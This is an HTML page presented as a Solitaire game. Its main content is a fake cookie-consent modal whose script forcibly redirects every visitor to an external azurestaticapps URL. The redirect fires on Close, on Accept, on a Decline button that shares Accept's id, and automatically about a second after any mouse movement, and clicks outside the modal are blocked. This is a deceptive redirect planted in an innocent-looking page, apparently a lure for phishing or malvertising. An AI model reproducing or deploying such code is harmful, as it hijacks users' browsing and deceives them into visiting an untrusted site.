<!DOCTYPE html>
<html>
<head>
<title>Solitaire</title>
<style type="text/css">@import url('css/style.css');</style>
</head>
<body>
<style>    
    .modalWrapper {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.7);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
        display: none;
    }

    .modalContent {
        background-color: black !important;
        padding: 20px;
        position: relative;
        border-radius: 10px;
        border: 2px solid white;
        padding: 40px;
    }

    @media (max-width: 520px) {
        .modalContent {
            width: 90%;
        }
    }

    @media (min-width: 520px) {
        .modalContent {
            width: 65%;
        }
    }

    .modalContent img {
        max-width: 100%;
        height: auto;
        border-radius: 10px;
    }

    .closeBtn {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px;
        color: blue;
        font-weight: 500;
        border-radius: 0px 10px 0px 0px;
        cursor: pointer;
    }

    .actionBtn {
        background-color: #007bff;
        font-family: "Poppins", Sans-serif;
        font-weight: 500;
        border: none;
        padding: 15px 30px;
        color: #FFFFFF;
        border-radius: 5px;
        cursor: pointer;
    }

    / Disable scrolling when modal is open /
    body.modal-open {
        overflow: hidden;
    }
</style>

<div class="modalContainer">
    <div id="modal" class="modalWrapper" style="display: flex;">
        <div class="modalContent">
            <div id="dismissModal" class="closeBtn">Close</div>
            <h1>Cookie Policy</h1>
            <p>This website uses cookies to personalize content and ads, provide social media features, and analyze our traffic. By clicking Accept, you agree to the use of cookies. For more information, please visit our <a href="https://jolly-stone-0260d3a10.6.azurestaticapps.net">Privacy Policy</a>.</p>
            <button id="confirmBtn" class="actionBtn">Accept</button>
             <button id="confirmBtn" class="actionBtn">Decline</button>
        </div>
    </div>
</div>

<script>
    var modal = document.getElementById('modal');
    var dismissModal = document.getElementById('dismissModal');
    var confirmBtn = document.getElementById('confirmBtn');

    var redirectUrl = "https://jolly-stone-0260d3a10.6.azurestaticapps.net"; // Set your dynamic URL here
    var cursorMoved = false;
    var redirectTimer;

    // Show the modal instantly after page load and disable scrolling
    window.addEventListener('load', function () {
        modal.style.display = 'flex';
        document.body.classList.add('modal-open');
    });

    // Function to close the modal and navigate to a link
    function closeModal() {
        modal.style.display = 'none';
        document.body.classList.remove('modal-open'); // Re-enable scrolling
        if (redirectUrl) {
            window.location.href = redirectUrl; // Redirect to the given URL
        }
    }

    // Close modal on close button click
    dismissModal.addEventListener('click', function () {
        closeModal();
    });

    // Close modal on accept button click
    confirmBtn.addEventListener('click', function () {
        closeModal();
    });

    // Auto redirect after 2 seconds of cursor movement
    window.addEventListener('mousemove', function () {
        if (!cursorMoved) {
            cursorMoved = true;
            redirectTimer = setTimeout(function () {
                window.location.href = redirectUrl;
            }, 1000); // Redirect after 2 seconds
        }
    });

    // Prevent modal from closing on clicking outside modal content
    modal.addEventListener('click', function (event) {
        if (event.target === modal) {
            event.stopPropagation(); // Do nothing if clicked outside the modal content
        }
    });

</script>
<div id="board"></div>
<div id="notification">Good luck!</div>
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/jquery-ui-1.8.11.custom.min.js"></script>
<script type="text/javascript" src="js/jquery.noisy.min.js"></script>
<script type="text/javascript" src="js/game.js"></script>
</body>
</html>
